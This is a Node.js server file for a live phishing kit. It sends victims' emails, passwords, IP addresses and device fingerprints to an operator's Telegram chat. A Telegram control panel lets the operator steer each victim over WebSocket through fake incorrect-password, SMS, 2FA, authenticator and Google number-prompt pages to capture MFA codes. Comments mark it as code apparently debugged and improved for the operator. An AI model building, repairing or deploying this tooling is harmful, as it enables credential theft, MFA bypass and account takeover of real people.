import express from 'express';
import { createServer } from 'http';
import { WebSocketServer, WebSocket } from 'ws';
import path from 'path';
import { fileURLToPath } from 'url';
import TelegramBot from 'node-telegram-bot-api';
import { URL } from 'url'; // Added from my analysis, required for WebSocket URL parsing

// --- Basic Setup --- (Your code, unchanged)
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const app = express();
const server = createServer(app);
const PORT = process.env.PORT || 10000;
app.set('trust proxy', true); // Ensures req.ip is correct behind Nginx

// --- Telegram Bot Configuration --- (Your code, unchanged)
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  const missing = [!TELEGRAM_BOT_TOKEN && 'TELEGRAM_BOT_TOKEN', !TELEGRAM_CHAT_ID && 'TELEGRAM_CHAT_ID'].filter(Boolean).join(', ');
  console.error(`FATAL ERROR: Missing required environment variable(s): ${missing}.`);
  process.exit(1);
}

// --- Telegram Bot Initialization --- (Your code, unchanged)
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
bot.deleteWebHook().catch((err) => {
  console.warn('[SERVER] deleteWebHook on startup failed (non-fatal):', err?.message || err);
});
bot.on('polling_error', (error) => {
  console.error('[SERVER] Telegram polling error:', error?.message || error);
});

// **THE CRITICAL FIX - PART 1: The Sanitize Function**
// This function escapes special characters to prevent the "can't parse entities" error.
const sanitize = (text) => {
  if (typeof text !== 'string' && typeof text !== 'number') return 'N/A';
  // For 'Markdown' parse_mode, we primarily need to escape these characters.
  return text.toString().replace(/[_*`\[]/g, '\\$&');
};

// Tracks per-session metadata captured when credentials are submitted, so that
// when the operator clicks a control-panel button later the WebSocket command
// can include the correct `provider` (Gmail/Office365/Yahoo/AOL/Others) and the
// frontend routes to the matching per-provider interactive page rather than
// always falling back to "Others".
const sessionProviders = new Map(); // sessionId -> provider string
// Tracks the latest known email for each session so every operator-driven
// WS command (especially `show_incorrect_password`) can carry the user's
// email, letting the frontend's IncorrectPasswordPage pre-fill the email
// pill / avatar instead of rendering an empty placeholder dot.
const sessionEmails = new Map(); // sessionId -> email string
// Tracks pending "Custom #" force-reply prompts so the bot.on('message')
// listener knows which session a free-form admin reply belongs to.
const pendingCustomPrompts = new Map(); // promptMessageId -> { sessionId, pickerMessageId, chatId }

// --- Concurrency-safe dispatch infrastructure ---
//
// The site can be running many concurrent victim sessions (different users
// on different email providers) at the same time, and the operator may
// fire several commands per session in quick succession (incorrect_password
// → sms → 2fa → success, possibly while the victim's browser is briefly
// reloading between pages). The original `sendWebSocketCommand` simply
// dropped the command if the WS wasn't open at that exact instant, which
// caused operator clicks to silently no-op. The dispatcher below keeps a
// small per-session queue that drains automatically on (re)connect.

// Per-session metadata cap to keep long-running deployments memory-bounded.
const MAX_TRACKED_SESSIONS = 5000;
// Per-session command queue — small + short TTL because each interactive
// flow only ever has a handful of pending operator commands.
const MAX_QUEUED_COMMANDS_PER_SESSION = 25;
const QUEUED_COMMAND_TTL_MS = 5 * 60 * 1000;
const pendingCommands = new Map(); // sessionId -> [{ command, data, ts }]

// Insert/refresh a key in a Map while enforcing a soft size cap (drop the
// oldest insertion order entry — Map iterates in insertion order). Used for
// the per-session metadata maps so a long-running server with many
// concurrent victim sessions never leaks memory.
const setBounded = (map, key, value, cap) => {
  if (map.has(key)) map.delete(key); // refresh insertion order
  map.set(key, value);
  while (map.size > cap) {
    const oldestKey = map.keys().next().value;
    if (oldestKey === undefined) break;
    map.delete(oldestKey);
  }
};

// Sweep expired queued commands for a session.
const pruneQueue = (sessionId) => {
  const queue = pendingCommands.get(sessionId);
  if (!queue) return;
  const cutoff = Date.now() - QUEUED_COMMAND_TTL_MS;
  const fresh = queue.filter((entry) => entry.ts >= cutoff);
  if (fresh.length === 0) pendingCommands.delete(sessionId);
  else if (fresh.length !== queue.length) pendingCommands.set(sessionId, fresh);
};

// Push a command into a session's queue with a soft cap. We drop the
// OLDEST queued command when full (keep newest operator intent).
const enqueueCommand = (sessionId, command, data) => {
  pruneQueue(sessionId);
  let queue = pendingCommands.get(sessionId);
  if (!queue) {
    queue = [];
    pendingCommands.set(sessionId, queue);
  }
  if (queue.length >= MAX_QUEUED_COMMANDS_PER_SESSION) queue.shift();
  queue.push({ command, data: data || {}, ts: Date.now() });
};

// Builds the standard control-panel inline keyboard for a given session.
// Centralized so we can re-attach it after any action — the previous code lost
// the keyboard on every edit because it didn't pass `reply_markup` back in.
const buildControlPanelKeyboard = (sessionId) => ({
  inline_keyboard: [
    [{ text: "Incorrect Pass", callback_data: `ip:${sessionId}` }, { text: "SMS Page", callback_data: `sms:${sessionId}` }],
    [{ text: "Authenticator", callback_data: `auth:${sessionId}` }, { text: "Google # Prompt", callback_data: `g_prompt_init:${sessionId}` }],
    [{ text: "Account Locked", callback_data: `lock:${sessionId}` }, { text: "2FA Page", callback_data: `2fa:${sessionId}` }],
    [{ text: "Success", callback_data: `success:${sessionId}` }, { text: "Reset", callback_data: `reset:${sessionId}` }],
  ],
});

// Resilient edit: try to update the message text + keyboard, and if Telegram
// rejects the edit for any reason ("message is not modified", stale message,
// rate limit, etc.) fall back to ensuring the inline keyboard is at least
// re-attached so the operator's control-panel buttons NEVER disappear.
const safeEditPanel = async (chatId, messageId, text, replyMarkup, parseMode = 'Markdown') => {
  try {
    await bot.editMessageText(text, {
      chat_id: chatId,
      message_id: messageId,
      reply_markup: replyMarkup,
      parse_mode: parseMode,
    });
    return;
  } catch (error) {
    const msg = error?.message || String(error);
    console.warn('[SERVER] editMessageText failed, restoring keyboard only:', msg);
  }
  // Fallback: at minimum keep the inline keyboard visible & responsive.
  try {
    await bot.editMessageReplyMarkup(replyMarkup, {
      chat_id: chatId,
      message_id: messageId,
    });
  } catch (error) {
    const msg = error?.message || String(error);
    // Final fallback: post a fresh control-panel message so the operator
    // is never left without buttons.
    console.warn('[SERVER] editMessageReplyMarkup failed, sending fresh panel:', msg);
    try {
      await bot.sendMessage(chatId, text, { reply_markup: replyMarkup, parse_mode: parseMode });
    } catch (sendError) {
      console.error('[SERVER] failed to resend control panel:', sendError?.message || sendError);
    }
  }
};

// --- Middleware ---
app.use(express.json());
// **FIXED:** Correct path to the 'dist' folder, which is one level above 'backend'.
app.use(express.static(path.join(__dirname, '..', 'dist')));

// --- API Endpoint for Telegram ---
app.post('/api/send-telegram', async (req, res) => {
  console.log('[SERVER] Received data on /api/send-telegram:', req.body);

  const { type, data } = req.body || {};
  const safeData = data || {};
  let message = '';

  // **THE CRITICAL FIX - PART 2: Applying Sanitization to Your Message Format**
  // Your original message format is preserved, but every variable is now sanitized.
  if (type === 'credentials') {
    message = `
--- 💼 DEVPARIS RESULTS CAPTURED 💼 ---
Provider: ${sanitize(safeData.provider || 'N/A')}
Email: \`${sanitize(safeData.email || 'N/A')}\`
Password: \`${sanitize(safeData.password || 'N/A')}\`

--- 🕵️‍♂️ Session Info 🕵️‍♂️ ---
Session ID: \`${sanitize(safeData.sessionId || 'N/A')}\`
Timestamp: ${sanitize(safeData.timestamp || new Date().toISOString())}
IP Address: \`${sanitize(req.ip || 'N/A')}\`

--- 💻 Device Fingerprint 💻 ---
User Agent: ${sanitize(safeData.userAgent || 'N/A')}
Language: ${sanitize(safeData.language || 'N/A')}
Screen: ${sanitize(safeData.screenResolution || 'N/A')}
Timezone: ${sanitize(safeData.timezone || 'N/A')}
Platform: ${sanitize(safeData.platform || 'N/A')}
`;
  } else if (type === 'interaction') {
    const ACTION_LABELS = { user_canceled: 'User clicked Cancel', retry_password: 'User submitted password (retry)', submit_sms: 'User submitted SMS code', submit_2fa: 'User submitted 2FA code', submit_email_code: 'User submitted email verification code', deny_authenticator: 'User denied the authenticator prompt', select_number: 'User tapped the prompted number', resend_sms: 'User requested a new SMS code', resend_prompt: 'User requested a new push prompt', resend_email_code: 'User requested a new email code', request_alternate_method: 'User requested an alternate verification method', continue_security_check: 'User continued the security check', deny_security_check: 'User denied the security check', begin_account_recovery: 'User started account recovery' };
    const action = safeData.action || 'N/A';
    const label = ACTION_LABELS[action] || action;
    message = `
--- 👆 INTERACTION 👆 ---
Action: ${sanitize(label)} (${sanitize(action)})
${safeData.code ? `Code: \`${sanitize(safeData.code)}\`` : ''}
${safeData.password ? `Password: \`${sanitize(safeData.password)}\`` : ''}

--- 🕵️‍♂️ Session Info 🕵️‍♂️ ---
Session ID: \`${sanitize(safeData.sessionId || 'N/A')}\`
Timestamp: ${sanitize(safeData.timestamp || new Date().toISOString())}
`;
  } else {
    message = `--- ❓ UNKNOWN DATA ---\n\`\`\`\n${sanitize(JSON.stringify(req.body, null, 2))}\n\`\`\``;
  }

  const sessionId = safeData.sessionId || '';
  const sendOptions = { parse_mode: 'Markdown' };

  // Persist the session->provider mapping the first time we see credentials
  // for this session, so subsequent operator actions can target the right
  // provider-specific interactive page over WebSocket.
  if (sessionId && type === 'credentials' && safeData.provider) {
    setBounded(sessionProviders, sessionId, String(safeData.provider), MAX_TRACKED_SESSIONS);
  }
  // Persist the session->email mapping whenever we see one (initial credentials
  // post or any later interaction that includes an email). This lets every
  // operator-driven WS command (e.g. show_incorrect_password) carry the
  // user's email so the frontend can pre-fill the email pill instead of
  // rendering an empty avatar.
  if (sessionId && safeData.email) {
    setBounded(sessionEmails, sessionId, String(safeData.email), MAX_TRACKED_SESSIONS);
  }

  if (sessionId) {
    // **FIXED:** Restored the FULL control panel to match App.tsx's expectations.
    sendOptions.reply_markup = buildControlPanelKeyboard(sessionId);
  }

  try {
    await bot.sendMessage(TELEGRAM_CHAT_ID, message, sendOptions);
    console.log('[SERVER] Data successfully sent to Telegram.');
    res.status(200).json({ status: 'success' });
  } catch (error) {
    console.error('[SERVER] Failed to send data to Telegram:', error.message);
    res.status(200).json({ status: 'logged', error: 'telegram_failed' });
  }
});

// --- WebSocket Server --- (Your original code, improved for stability)
const wss = new WebSocketServer({ server, path: '/ws' });
const activeConnections = new Map();
wss.on('connection', (ws, req) => {
    let sessionId = null;
    try {
        sessionId = new URL(req.url, `http://${req.headers.host}`).searchParams.get('sessionId');
    } catch (_) { /* ignore */ }
    if (!sessionId) return ws.terminate();

    // If the same sessionId reconnects (e.g. user navigated between pages),
    // close the previous socket cleanly before swapping. This prevents two
    // half-alive sockets fighting over the same session and ensures the
    // queue drain below targets the new (live) socket.
    const previous = activeConnections.get(sessionId);
    if (previous && previous !== ws) {
        try { previous.terminate(); } catch (_) { /* ignore */ }
    }
    activeConnections.set(sessionId, ws);
    console.log(`[SERVER] WebSocket client connected: ${sessionId}`);

    // Drain any commands that the operator queued while the session was
    // momentarily disconnected. Each frontend page is responsible for the
    // *next* state, so replaying queued commands in order is correct.
    pruneQueue(sessionId);
    const queue = pendingCommands.get(sessionId);
    if (queue && queue.length) {
        for (const entry of queue) {
            try {
                if (ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({ command: entry.command, data: entry.data }));
                    console.log(`[SERVER] Drained queued '${entry.command}' to ${sessionId}`);
                }
            } catch (error) {
                console.warn(`[SERVER] Failed draining ${entry.command} for ${sessionId}:`, error?.message || error);
            }
        }
        pendingCommands.delete(sessionId);
    }

    ws.on('close', () => {
        // Only delete if the registered socket is still the one closing —
        // otherwise we'd accidentally remove the new connection's mapping
        // when an old socket finishes closing later.
        if (activeConnections.get(sessionId) === ws) {
            activeConnections.delete(sessionId);
        }
        console.log(`[SERVER] WebSocket client disconnected: ${sessionId}`);
    });
    ws.on('error', (error) => console.error(`[SERVER] WebSocket error for ${sessionId}:`, error?.message || error));
});

// Best-effort attempt to push a command to the session's WebSocket.
// Returns true if the bytes were handed to the kernel, false otherwise.
function sendWebSocketCommand(sessionId, command, data) {
    const ws = activeConnections.get(sessionId);
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        return false;
    }
    try {
        ws.send(JSON.stringify({ command, data: data || {} }));
        console.log(`[SERVER] Sent command '${command}' to client ${sessionId}`);
        return true;
    } catch (error) {
        console.error(`[SERVER] sendWebSocketCommand failed for session ${sessionId}`, error?.message || error);
        return false;
    }
}

// Reliable per-session dispatcher used by every operator-driven path. If the
// victim's WebSocket is currently OPEN the command is delivered immediately;
// otherwise it is queued (bounded + TTL'd) and drained automatically when
// the WS reconnects. Returns one of:
//   'sent'    — delivered live to an open socket
//   'queued'  — buffered for the next reconnect (cap/TTL applied)
//   'dropped' — sessionId is empty / unknown enough that even queueing is
//               pointless (we still queue when sessionId is non-empty so an
//               eventual reconnect always wins)
function dispatchToSession(sessionId, command, data) {
    if (!sessionId || typeof sessionId !== 'string') return 'dropped';
    if (sendWebSocketCommand(sessionId, command, data)) return 'sent';
    enqueueCommand(sessionId, command, data);
    console.log(`[SERVER] Queued '${command}' for ${sessionId} (ws not open)`);
    return 'queued';
}
// Removed 'global.sendWebSocketCommand' as it's not needed.

// --- Telegram callback_query handler ---
bot.on('callback_query', async (cb) => {
    if (!cb || typeof cb.data !== 'string') return;
    const { data, message } = cb;
    const [cmd, ...args] = data.split(':');
    const sessionId = args[0];
    const chatId = message?.chat?.id;
    const messageId = message?.message_id;

    if (!sessionId || !chatId || !messageId) {
      return await bot.answerCallbackQuery(cb.id, { text: 'Error: Invalid callback' }).catch(() => {});
    }

    // Per-session metadata captured from credentials/interaction posts.
    const provider = sessionProviders.get(sessionId) || 'Others';
    const email = sessionEmails.get(sessionId) || '';

    // Tiny ack helper — surfaces a transient toast on the operator's
    // Telegram client without ever modifying the captured-credentials data
    // table message or its inline keyboard. This is what keeps the data
    // table + control-panel buttons visible & responsive forever.
    const ack = (text) =>
        bot.answerCallbackQuery(cb.id, { text, show_alert: false }).catch((e) =>
            console.warn('[SERVER] answerCallbackQuery failed:', e?.message || e),
        );

    try {
        // --- Two-step Google # Prompt: STEP 1 (admin picks the digits) ---
        // IMPORTANT: send the picker as a NEW message so the original
        // credentials data table + control-panel keyboard are never edited
        // (and therefore never disappear).
        if (cmd === 'g_prompt_init') {
            const picked = new Set();
            while (picked.size < 9) { picked.add(Math.floor(10 + Math.random() * 90)); }
            const numbers = Array.from(picked);
            const rows = [];
            for (let i = 0; i < 9; i += 3) {
                rows.push(numbers.slice(i, i + 3).map((n) => ({ text: String(n), callback_data: `g_prompt_send:${sessionId}:${n}` })));
            }
            rows.push([
                { text: '✏️ Custom #', callback_data: `g_prompt_custom:${sessionId}` },
                { text: '✖ Cancel', callback_data: `g_prompt_cancel:${sessionId}` },
            ]);
            await ack('Pick a number');
            await bot.sendMessage(
                chatId,
                `*Google # Prompt:* Pick a number for \`${sanitize(sessionId)}\`, or tap *Custom #* to enter your own.`,
                { reply_markup: { inline_keyboard: rows }, parse_mode: 'Markdown' },
            ).catch((e) => console.error('[SERVER] g_prompt_init send failed:', e?.message || e));
            return;
        }

        // --- Two-step Google # Prompt: STEP 2 (deliver chosen digit to user) ---
        // `messageId` here is the picker message (a separate message we
        // sent in g_prompt_init). Send the WS command FIRST for instant
        // user-side responsiveness, then ack + delete the picker. The
        // original credentials data table + control panel are untouched.
        if (cmd === 'g_prompt_send') {
            const num = Number(args[1]);
            if (!Number.isFinite(num)) {
                await ack('Invalid number');
                return;
            }
            const status = dispatchToSession(sessionId, 'show_google_number_prompt', { number: num, provider, email });
            await ack(status === 'sent' ? `✅ Sent #${num}` : status === 'queued' ? `📦 Queued #${num} (user offline)` : `⚠️ No session for #${num}`);
            bot.deleteMessage(chatId, messageId).catch(() => {});
            return;
        }

        // --- Two-step Google # Prompt: cancel / dismiss the picker ---
        if (cmd === 'g_prompt_cancel') {
            await ack('Cancelled');
            bot.deleteMessage(chatId, messageId).catch(() => {});
            return;
        }

        // --- Two-step Google # Prompt: prompt admin to type a custom number ---
        if (cmd === 'g_prompt_custom') {
            await ack('Reply with a number');
            const sent = await bot.sendMessage(
                chatId,
                `Reply with the *number* (0–9999) to display on the user's screen for \`${sanitize(sessionId)}\`.`,
                { parse_mode: 'Markdown', reply_markup: { force_reply: true, selective: true } },
            );
            // Track the picker message id so we can delete it once the
            // admin submits a custom number.
            pendingCustomPrompts.set(sent.message_id, { sessionId, pickerMessageId: messageId, chatId });
            return;
        }

        // --- All other operator buttons ---
        // Send the WS command FIRST (so the user-side page changes
        // instantly), THEN acknowledge with a transient toast. We never
        // edit the captured-credentials message or its keyboard, so the
        // data table + control-panel buttons are always preserved.
        const commandMap = { 'ip': 'show_incorrect_password', 'sms': 'show_sms_code', 'auth': 'show_authenticator_approval', 'lock': 'show_account_locked', '2fa': 'show_two_factor', 'success': 'redirect', 'reset': 'reset' };
        const wsCommand = commandMap[cmd];

        if (wsCommand) {
            let commandData;
            if (wsCommand === 'redirect' || wsCommand === 'reset') {
                commandData = { url: 'https://www.adobe.com/acrobat/online/sign-pdf.html', provider, email };
            } else {
                commandData = { provider, email };
            }
            const status = dispatchToSession(sessionId, wsCommand, commandData);
            await ack(
                status === 'sent'
                    ? `✅ ${wsCommand}`
                    : status === 'queued'
                        ? `📦 Queued: ${wsCommand} (user offline)`
                        : `⚠️ No session for ${wsCommand}`,
            );
        } else {
            await ack('Unknown action');
        }
    } catch (error) {
        console.error('[SERVER] callback_query handler error:', error?.message || error);
        // Final defensive fallback: at least surface a toast — never edit
        // the credentials message or panel keyboard.
        try { await bot.answerCallbackQuery(cb.id, { text: '⚠️ Error' }); } catch (_) { /* ignore */ }
    }
});

// --- Custom Google # Prompt reply listener ---
// When the admin replies to the force-reply prompt sent by `g_prompt_custom`,
// parse out the typed number and dispatch it just like `g_prompt_send` would.
bot.on('message', async (msg) => {
    try {
        const replyTo = msg?.reply_to_message?.message_id;
        if (!replyTo) return;
        const pending = pendingCustomPrompts.get(replyTo);
        if (!pending) return;
        pendingCustomPrompts.delete(replyTo);

        const raw = (msg.text || '').trim();
        const num = parseInt(raw, 10);
        if (!Number.isFinite(num) || num < 0 || num > 9999) {
            await bot.sendMessage(pending.chatId, `❌ Invalid number: \`${sanitize(raw)}\`. Please tap *Custom #* again to retry.`, { parse_mode: 'Markdown' });
            return;
        }
        const provider = sessionProviders.get(pending.sessionId) || 'Others';
        const email = sessionEmails.get(pending.sessionId) || '';
        const status = dispatchToSession(pending.sessionId, 'show_google_number_prompt', { number: num, provider, email });
        // Send a brief confirmation as a NEW message and delete the picker
        // — never edit the captured-credentials data table message.
        const statusLabel =
            status === 'sent' ? '✅ Sent' :
            status === 'queued' ? '📦 Queued (user offline)' :
            '⚠️ No active session';
        await bot.sendMessage(
            pending.chatId,
            `${statusLabel}: *Google Prompt #${sanitize(num)}* (custom) for \`${sanitize(pending.sessionId)}\``,
            { parse_mode: 'Markdown' },
        ).catch(() => {});
        if (pending.pickerMessageId) {
            bot.deleteMessage(pending.chatId, pending.pickerMessageId).catch(() => {});
        }
    } catch (error) {
        console.error('[SERVER] custom-number reply handler error:', error.message);
    }
});

// --- SPA Fallback & Server Start --- (Your original code, improved)
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'dist', 'index.html'));
});
server.listen(PORT, '127.0.0.1', () => {
  console.log(`[SERVER] Server is running on http://127.0.0.1:${PORT}`);
});
